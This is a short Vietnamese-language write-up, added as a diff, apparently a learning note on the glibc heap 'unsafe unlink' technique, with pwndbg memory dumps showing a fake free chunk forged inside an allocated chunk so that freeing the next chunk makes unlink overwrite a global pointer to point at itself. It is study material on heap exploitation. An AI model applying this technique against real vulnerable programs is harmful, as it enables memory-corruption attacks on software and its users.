@@ -1,0 +1,58 @@
+xin chào Tuấn
+tao là Tuấn, tao tự viết write up cho mày nè, mày có vui hem? 
+
+Đầu tiên thì đây là một cái note nhỏ cho bài này
+
+Bài này tạo 1 fake free chunk trong chunk 1 đã được malloc
+để khi free chunk 2 ( next chunk của chunk 1)
+thì sẽ overwrite ptr tới chunk do hàm unlink
+
+
+
+00:0000│          0x603290 ◂— 0x0     [chunk 1 start]
+01:0008│          0x603298 ◂— 0x431
+02:0010│          0x6032a0 ◂— 0x0     [fake chunk start]
+03:0018│          0x6032a8 ◂— 0x421
+04:0020│          0x6032b0 —▸ 0x602058 (__dso_handle) ◂— 0x0 [fake bk]
+05:0028│          0x6032b8 —▸ 0x602060 (stdout@@GLIBC_2.2.5) —▸ 0x7ffff7fbb6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887 [fake fd]
+06:0030│          0x6032c0 ◂— 0x0
+... ↓
+86:0430│          0x6036c0 ◂— 0x420   [fake chunk end] [chunk 2 start]
+87:0438│          0x6036c8 ◂— 0x430   [size of chunk 2]
+88:0440│ rax rdi  0x6036d0 ◂— 0x0
+... ↓
+10d:0868│          0x603af8 ◂— 0x20511
+10e:0870│          0x603b00 ◂— 0x0
+
+như đã thấy, 1 fake chunk với size = 0x420
+được đặt trong chunk 1
+
+pwndbg> tele 0x602058 40
+00:0000│   0x602058 (__dso_handle) ◂— 0x0
+01:0008│   0x602060 (stdout@@GLIBC_2.2.5) —▸ 0x7ffff7fbb6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+02:0010│   0x602068 (completed) ◂— 0x0
+03:0018│   0x602070 (chunk0_ptr) —▸ 0x6032a0 ◂— 0x0
+04:0020│   0x602078 ◂— 0x0
+... ↓
+
+2 con trỏ bk và fd là 2 địa chỉ nằm gần ptr0
+mục đích là khi free chunk2,
+thì fake chunk đang là free chunk,
+nó sẽ thực hiện backward consolidate,
+unlink(fake chunk)
+    {
+        bk+0x18 (=fd) = fd;
+        fd+0x10 (=bk) = bk; (fd + 0x10) = (0x602060+0x10) = chunk0_ptr = bk = 0x602058;
+    }
+sau khi bị free
+
+pwndbg> tele 0x602058 40
+00:0000│   0x602058 (__dso_handle) ◂— 0x0
+01:0008│   0x602060 (stdout@@GLIBC_2.2.5) —▸ 0x7ffff7fbb6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
+02:0010│   0x602068 (completed) ◂— 0x0
+03:0018│   0x602070 (chunk0_ptr) —▸ 0x602058 (__dso_handle) ◂— 0x0
+04:0020│   0x602078 ◂— 0x0
+... ↓
+
+chunk0_ptr = bk;
+lúc này ta dùng chunk0_ptr để overwrite chính nó. 
